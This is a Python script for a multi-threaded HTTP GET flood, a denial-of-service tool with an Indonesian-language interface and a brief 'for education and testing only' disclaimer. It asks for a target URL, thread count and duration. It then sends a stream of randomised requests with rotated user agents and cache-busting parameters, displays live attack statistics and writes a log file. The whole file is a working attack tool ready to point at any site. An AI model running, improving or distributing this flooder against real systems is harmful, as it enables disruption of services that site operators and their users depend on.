
import requests
import threading
import time
import random
from datetime import datetime
import sys
import os

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)',
    'Mozilla/5.0 (Linux; Android 10)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X)'
]

class AttackStats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.log_file = open('log_ddos.txt', 'a')
        self.log_file.write(f"\n\n===== NEW ATTACK STARTED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} =====\n")
    
    def add_request(self, status_code):
        with self.lock:
            self.total += 1
            if 200 <= status_code < 300:
                self.success += 1
            else:
                self.failed += 1
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.log_file.write(f"[{timestamp}] Status: {status_code}\n")
    
    def get_rps(self):
        elapsed = time.time() - self.start_time
        return self.total / elapsed if elapsed > 0 else 0
    
    def close_log(self):
        self.log_file.close()

def worker(stats, target, stop_event):
    while not stop_event.is_set():
        try:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Connection': 'keep-alive'
            }
            params = {"id": random.randint(1, 10000), "q": random.random()}
            response = requests.get(target, headers=headers, params=params, timeout=5)
            stats.add_request(response.status_code)
        except requests.RequestException:
            stats.add_request(0)

def display_stats(stats, stop_event, target, num_threads, duration):
    print("\033[?25l", end="")
    time.sleep(0.2)
    
    while not stop_event.is_set():
        elapsed = time.time() - stats.start_time
        rps = stats.get_rps()
        
        with stats.lock:
            total = stats.total
            success = stats.success
            failed = stats.failed
        
        sys.stdout.write("\033[H\033[J")
        print("\033[1;36m" + "=" * 50)
        print("HTTP GET FLOOD ATTACK".center(50))
        print("=" * 50 + "\033[0m")
        
        print(f"\033[93mTarget     : \033[0m{target}")
        print(f"\033[93mThreads    : \033[0m{num_threads}")
        print(f"\033[93mElapsed    : \033[0m{elapsed:.1f}s / {duration}s")
        print("\033[92m" + "-" * 50 + "\033[0m")
        print(f"\033[94mTotal Req  : \033[1;97m{total}\033[0m")
        print(f"\033[92mSuccessful : \033[1;97m{success}\033[0m")
        print(f"\033[91mFailed     : \033[1;97m{failed}\033[0m")
        print(f"\033[96mReq/Sec    : \033[1;97m{rps:.1f}\033[0m")
        print("\033[92m" + "-" * 50 + "\033[0m")
        
        frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
        frame = frames[int(time.time() * 4) % len(frames)]
        print(f"\n\033[95m{frame} Attacking... Press Ctrl+C to stop\033[0m")
        
        sys.stdout.flush()
        time.sleep(0.2)
    
    print("\033[?25h", end="")

def main():
    os.system("clear")
    print("\033[1;36m")
    print("=" * 50)
    print(" PYTHON HTTP GET FLOOD TOOL ".center(50))
    print("=" * 50)
    print("\033[0m")
    print("\033[93mNote: Untuk tujuan edukasi dan testing saja!\033[0m")
    print("\033[91mJangan gunakan untuk aktivitas ilegal!\033[0m\n")
    
    target = input("\033[94m[?] Target URL (contoh: https://example.com): \033[0m")
    num_threads = int(input("\033[94m[?] Jumlah thread: \033[0m"))
    duration = int(input("\033[94m[?] Durasi serangan (detik): \033[0m"))
    
    if not target.startswith('http'):
        print("\033[91mError: Target harus dimulai dengan http/https\033[0m")
        exit()

    stats = AttackStats()
    stop_event = threading.Event()
    
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(stats, target, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)
    
    display_thread = threading.Thread(target=display_stats, args=(stats, stop_event, target, num_threads, duration))
    display_thread.daemon = True
    display_thread.start()
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n\033[91mSerangan dihentikan manual!\033[0m")
    finally:
        stop_event.set()
        time.sleep(1)
    
    print("\n\033[1;36m" + "=" * 50)
    print(" ATTACK SUMMARY ".center(50))
    print("=" * 50 + "\033[0m")
    print(f"\033[93m{'Target:':<15}\033[0m {target}")
    print(f"\033[93m{'Durasi:':<15}\033[0m {duration} detik")
    print(f"\033[93m{'Threads:':<15}\033[0m {num_threads}")
    print(f"\033[93m{'Total Request:':<15}\033[0m {stats.total}")
    print(f"\033[92m{'Berhasil:':<15}\033[0m {stats.success}")
    print(f"\033[91m{'Gagal:':<15}\033[0m {stats.failed}")
    print(f"\033[96m{'Rata-rata RPS:':<15}\033[0m {stats.get_rps():.1f}")
    print("\033[1;36m" + "=" * 50 + "\033[0m")
    print(f"Log disimpan di: \033[93mlog_ddos.txt\033[0m\n")
    
    stats.close_log()

main()
